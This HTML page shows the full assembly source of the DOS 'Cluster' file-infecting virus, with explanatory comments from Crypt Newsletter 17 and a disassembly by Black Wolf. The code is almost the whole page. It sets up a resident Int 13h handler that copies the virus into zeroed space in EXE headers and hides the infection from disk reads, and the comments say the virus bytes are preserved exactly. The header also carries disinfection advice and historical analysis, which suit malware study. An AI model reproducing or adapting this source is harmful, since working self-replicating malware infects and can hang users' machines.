<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>CLUST.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;The Cluster virus is an interesting experiment which works, almost.</span><span class="sc0">
</span><span class="sc1">;It it what has come to be known as an 'intended' virus, although a</span><span class="sc0">
</span><span class="sc1">;a very slickly done one.</span><span class="sc0">
</span><span class="sc1">;Credited to the TridenT virus programming group, Cluster uses some of</span><span class="sc0">
</span><span class="sc1">;the ideas of the Bulgarian virus known as The Rat.  The Rat was deemed</span><span class="sc0">
</span><span class="sc1">;tricky because it looked for "00" empty space below the header in</span><span class="sc0">
</span><span class="sc1">;an EXEfile - if it found enough room for itself, it wrote itself out</span><span class="sc0">
</span><span class="sc1">;to the empty space or "air" in the file.  This hid the virus in the </span><span class="sc0">
</span><span class="sc1">;file, but added no change in file size.  This is a nice theme - one</span><span class="sc0">
</span><span class="sc1">;made famous by the ZeroHunt virus which first did the same with</span><span class="sc0">
</span><span class="sc1">;.COMfiles.  In both cases, the viruses had to be picky about the</span><span class="sc0">
</span><span class="sc1">;files they infected, limiting their spread.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Cluster is similar to The Rat.  It will attempt to copy itself into</span><span class="sc0">
</span><span class="sc1">;the "air" in an EXEfile just below the file header, if there is</span><span class="sc0">
</span><span class="sc1">;enough room.  The most common candidates for infection are standard</span><span class="sc0">
</span><span class="sc1">;MS/PC-DOS utility programs, like FIND or FC, among others.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;As is Cluster will go resident from the "germ" supplied with the</span><span class="sc0">
</span><span class="sc1">;newsletter.  On copy, if the candidate .EXEfile has enough "00"</span><span class="sc0">
</span><span class="sc1">;air, Cluster will infect it.  In other words, any .EXEfile</span><span class="sc0">
</span><span class="sc1">;written to will be inspected by Cluster.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Because Cluster installs its own INT 13 disk hander, it then can</span><span class="sc0">
</span><span class="sc1">;intercept all attempts to open infected files for a quick look.</span><span class="sc0">
</span><span class="sc1">;For example, looking at a hex dump of a Cluster-infected .EXE,</span><span class="sc0">
</span><span class="sc1">;with Vern Berg's LIST, will show the files clean.  Now, boot</span><span class="sc0">
</span><span class="sc1">;the system clean and look again.  You'll see Cluster in the file's</span><span class="sc0">
</span><span class="sc1">;"00" space - look for the funny "Zugu" signature.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;However, almost all files infected by Cluster under DOS 5.0 and 6.0</span><span class="sc0">
</span><span class="sc1">;are mishandled in such way that they cannot execute properly except</span><span class="sc0">
</span><span class="sc1">;when the virus is not resident. Normally, what happens is Cluster  </span><span class="sc0">
</span><span class="sc1">;will go resident and the system will hang.  And this is what is</span><span class="sc0">
</span><span class="sc1">;meant by an 'intended' virus - Cluster is very infectious, but only </span><span class="sc0">
</span><span class="sc1">;infectious on a machine which is contaminated with the "germ" file</span><span class="sc0">
</span><span class="sc1">;supplied by TridenT. Although Cluster may behave better on other</span><span class="sc0">
</span><span class="sc1">;platforms, it's not viable on most of the systems rolling out </span><span class="sc0">
</span><span class="sc1">;of shops today.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Additional notes and disassembly are all Black Wolf's. --Urnst Kouch</span><span class="sc0">
</span><span class="sc1">;Crypt Newsletter 17.</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This virus goes memory resident at the top of lower memory and hooks</span><span class="sc0">
</span><span class="sc1">;Int 13h.  Whenever an EXE file header is written, it checks to see</span><span class="sc0">
</span><span class="sc1">;if there is a large field of 0's inside it (VERY common in EXE's)</span><span class="sc0">
</span><span class="sc1">;and, if so, will put itself inside it and change the exe marker bytes</span><span class="sc0">
</span><span class="sc1">;'MZ' to a jump to that code.  In this way, it effectively converts the</span><span class="sc0">
</span><span class="sc1">;file to a COM file when it is run.  After this it re-executes the EXE</span><span class="sc0">
</span><span class="sc1">;file.  Because of a stealth handler on Int 13h function 2 (absolute</span><span class="sc0">
</span><span class="sc1">;disk read) the EXE file is read as it originally was (the handler</span><span class="sc0">
</span><span class="sc1">;zero's out the field in which it resides and restores the jump to</span><span class="sc0">
</span><span class="sc1">;'MZ').  Because of the way this virus works, it can only infect</span><span class="sc0">
</span><span class="sc1">;smaller EXE files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;NOTE:</span><span class="sc0">
</span><span class="sc1">;Several commands are commented out and have the actual bytes entered</span><span class="sc0">
</span><span class="sc1">;next to them instead. This is because the compiler that Clust was </span><span class="sc0">
</span><span class="sc1">;originally compiled on used different translations than mine, and</span><span class="sc0">
</span><span class="sc1">;I wished to preserve the EXACT virus code.</span><span class="sc0">

</span><span class="sc1">;Disinfection: Because of this virus' stealth routine, disinfection should</span><span class="sc0">
</span><span class="sc1">;              be possible simply by Zipping or Arjing all EXE files on an</span><span class="sc0">
</span><span class="sc1">;              infected disk, then rebooting from a clean disk and unarchiving</span><span class="sc0">
</span><span class="sc1">;              the files.  The original archiving MUST be done while the</span><span class="sc0">
</span><span class="sc1">;              virus is active in memory.  Also - after rebooting - make</span><span class="sc0">
</span><span class="sc1">;              sure the program you use to unarchive the files is _NOT_</span><span class="sc0">
</span><span class="sc1">;              infected.</span><span class="sc0">

</span><span class="sc1">;Disassembly by Black Wolf</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
  
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc0">
        
</span><span class="sc5">LotsaNOPs</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">122</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;Usually will be EXE header....</span><span class="sc0">

</span><span class="sc5">OldInt13</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EntryPoint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;jmp     InstallVirus</span><span class="sc0">
        
</span><span class="sc5">Int13Handler</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">IsDiskWrite</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GoInt13</span><span class="sc0">
        
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">OldInt13</span><span class="sc0">               </span><span class="sc1">;Call Int 13h</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Exit13Handler</span><span class="sc0">             </span><span class="sc1">;Exit on error.</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">7EEBh</span><span class="sc0">    </span><span class="sc1">;Is sector infected?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit13Handler</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">    </span><span class="sc1">;Cover mark with 'MZ'</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;Stealth routine.....</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">115h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">                  </span><span class="sc1">;mov     di,bx</span><span class="sc0">
        
                          </span><span class="sc1">;Zero out virus from</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                    </span><span class="sc1">;sector when it is read.</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                     
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  
</span><span class="sc5">Exit13Handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">         
</span><span class="sc5">GoInt13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">IsDiskWrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">  </span><span class="sc1">;Is EXE file being written?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GoInt13</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">75h</span><span class="sc0">  </span><span class="sc1">;Is file too large?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">GoInt13</span><span class="sc0">     
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc0">                 </span><span class="sc1">;mov     si,bx</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                   </span><span class="sc1">;Look in EXE header....</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">115h</span><span class="sc0">
</span><span class="sc5">AllZeros</span><span class="sc4">:</span><span class="sc0">                       
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">loopz</span><span class="sc0">   </span><span class="sc5">AllZeros</span><span class="sc0">
  
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;Check to see if entire field</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ExitInfectHandler</span><span class="sc0">       </span><span class="sc1">;was zeroed - leave if not.</span><span class="sc0">
        
        
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">                  </span><span class="sc1">;mov     di,bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">115h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldInt13</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">                </span><span class="sc1">;mov     di,bx</span><span class="sc0">
                        
                        </span><span class="sc1">;Copy virus</span><span class="sc0">
                        </span><span class="sc1">;over zero area in EXE header.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7EEBh</span><span class="sc0">                </span><span class="sc1">;Stick in Jump over 'MZ'</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                

</span><span class="sc5">ExitInfectHandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;Allow Write to process now.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GoInt13</span><span class="sc0">

</span><span class="sc5">InstallVirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3513h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Get Int 13 addres</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Flush disk buffers</span><span class="sc0">
               
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">;Get free space on default drive</span><span class="sc0">
                        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">       </span><span class="sc1">;Are we the last chain?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Terminate</span><span class="sc0">               </span><span class="sc1">;If not, terminate.</span><span class="sc0">
        
        </span><span class="sc1">;sub     word ptr ds:[3],39h     ;subtract from MCB size</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  
        
        </span><span class="sc1">;sub     word ptr ds:[12h],39h   ;subtract from PSP TopOfMem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldInt13</span><span class="sc0">
        
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc0">                </span><span class="sc1">;mov     di,si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ES = new segment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">115h</span><span class="sc0">                 </span><span class="sc1">;Copy virus into memory</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">   
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2513h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13Handler</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Set int 13 to virus handler</span><span class="sc0">
                     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Modify mem alloc.</span><span class="sc0">
               
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Get environment segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> 

</span><span class="sc5">ScanForFilename</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;Find name of file executed</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;in environment strings...</span><span class="sc0">
        </span><span class="sc6">scasw</span><span class="sc0">                           </span><span class="sc1">;(located after two 0's)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ScanForFilename</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;DS = environment segment</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;ES = code segment</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">            

</span><span class="sc5">CopyFilename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">            
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">StoreFilename</span><span class="sc0">           </span><span class="sc1">;Change zero at end of </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                  </span><span class="sc1">;filename to a return</span><span class="sc0">

</span><span class="sc5">StoreFilename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">            
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">                  </span><span class="sc1">;If it was a return, we're</span><span class="sc0">
        </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">CopyFilename</span><span class="sc0">            </span><span class="sc1">;done copying the filename</span><span class="sc0">
  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">28fh</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">         
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                     </span><span class="sc1">;Re-execute EXE file with</span><span class="sc0">
                        </span><span class="sc1">;Stealth handler in memory,</span><span class="sc0">
                        </span><span class="sc1">;so Exe is run w/o virus.</span><span class="sc0">
                        </span><span class="sc1">;here we go, infected program</span><span class="sc0">
</span><span class="sc5">Terminate</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;only executes properly when</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">                  </span><span class="sc1">;Cluster is resident.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">    
                   
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
